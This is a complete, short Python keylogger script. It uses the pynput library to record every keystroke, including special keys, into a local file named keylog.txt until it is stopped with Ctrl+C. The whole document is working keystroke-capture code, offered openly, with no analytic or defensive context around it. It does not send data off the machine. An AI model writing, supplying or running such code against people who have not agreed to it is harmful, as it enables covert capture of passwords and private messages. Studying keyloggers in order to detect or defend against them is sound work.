# Simple Keylogger in Python
from pynput import keyboard

# Specify the log file
LOG_FILE = "keylog.txt"

# Function to handle keystrokes
def on_press(key):
    try:
        # Log alphanumeric keys
        with open(LOG_FILE, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        # Log special keys (e.g., Enter, Space, Backspace)
        with open(LOG_FILE, "a") as log:
            log.write(f" {key} ")

# Function to start the keylogger
def start_keylogger():
    # Create a listener for keyboard input
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger is running... Press 'Ctrl + C' to stop.")
    start_keylogger()
